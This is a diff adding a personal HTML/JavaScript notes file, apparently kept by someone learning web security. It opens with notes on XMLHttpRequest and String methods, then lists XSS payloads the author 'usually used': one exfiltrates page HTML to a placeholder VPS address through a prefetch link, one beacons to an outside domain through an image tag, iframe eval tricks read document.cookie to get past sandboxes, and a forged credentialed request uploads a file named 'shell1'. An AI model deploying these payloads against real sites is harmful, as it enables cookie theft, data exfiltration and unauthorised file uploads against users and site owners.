@@ -1,0 +1,114 @@
+<!--  Firstly i want to recording The process of learning js -->
+<!-- [XMLHttpRequest object] -->
+<script>
+xmlHttp=null;
+if (window.XMLHttpRequest)
+{// code for IE7, Firefox, Opera, etc.
+	xmlHttp=new XMLHttpRequest();
+}
+else if (window.ActiveXObject)
+{// code for IE6, IE5
+	xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
+}
+if (xmlHttp!=null)
+{
+	xmlHttp.onreadystatechange=state_Change;//to define a function aim to get the state
+	xmlHttp.open("GET", "1.py", false);//true is asynchronous
+	xmlHttp.send(null);
+	xmlDoc=xmlHttp.responseText;//to get content of 1.py
+
+}
+else
+{
+	alert("Your browser does not support XMLHTTP.");
+}
+
+function state_Change()
+{
+	if (xmlHttp.readyState==4)//0 is uninitialized  and 4 is complete
+	{// 4 = "loaded"
+		if (xmlHttp.status==200)//return state
+		{// 200 = OK
+		// ...our code here...
+		}
+		else
+		{
+			alert("Problem retrieving XML data");
+		}
+	}
+}
+</script>
+
+
+ <!-- [String object] -->
+<script>
+str = "1234567890";
+str.charAt(1);//return the char
+str.charCodeAt(1)//return ascii
+String.fromCharCode(72,69,76,76,79)// unicode
+</script>
+
+<!-- /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// -->
+<!-- Secondly i write some funtions that i usually used -->
+
+<!-- [xss 1] -->
+<script>
+var node = document.createElement("link");
+node.setAttribute("rel", "prefetch");
+node.setAttribute("href", "http://ip/?a=" + String(document.getElementsByTagName("html")[0].innerHTML).substring(0,100));
+document.head.appendChild(node);
+// use prefetch  attribute to send message to your vps
+</script>
+
+<!-- [xss 2] -->
+<script>
+var img = new Image();
+img.setAttribute("src","http://yzbbd666.com")
+var node = document.getElementsByTagName('head')[0];
+node.appendChild(img);
+// use img lable
+</script>
+
+<!-- [xss 3] -->
+<!-- use iframe to bypass some sandbox and get other pages cookie -->
+
+ <iframe onload=this.contentWindow.eval(alert(1))></iframe>
+
+<!-- [xss 4] -->
+
+<script >
+	document.cookie='aaa';
+	delete alert;
+</script>
+
+<iframe onload=this.contentWindow.eval(alert(document.cookie))></iframe> <!-- this one is parent window -->
+<iframe src=javascript:alert(document.cookie)></iframe>   <!-- this one is iframe window -->
+
+<!-- [upload file] -->
+<script>
+https://juejin.im/post/58e4a174ac502e006c1e18f4 reference
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "2.php", false);
+xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
+xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------12264101169922");
+xhr.withCredentials = true;
+var body = "-----------------------------12264101169922\r\n" + 
+  "Content-Disposition: form-data; name=\"upfile\"; filename=\"shell1\"\r\n" + 
+  "Content-Type: text/plain\r\n" + 
+  "\r\n" + 
+  "shell\r\n" + 
+  "-----------------------------12264101169922\r\n" + 
+  "Content-Disposition: form-data; name=\"submit\"\r\n" + 
+  "\r\n" + 
+  "\xcc\xe1\xbd\xbb\xb2\xe9\xd1\xaf\r\n" + 
+  "-----------------------------12264101169922--\r\n";
+var aBody = new Uint8Array(body.length);
+for (var i = 0; i < aBody.length; i++)
+  aBody[i] = body.charCodeAt(i); 
+xhr.send(new Blob([aBody]));// https://www.jianshu.com/p/d175e6058b1b create file object
+alert(xhr.response);
+
+</script>
+
+
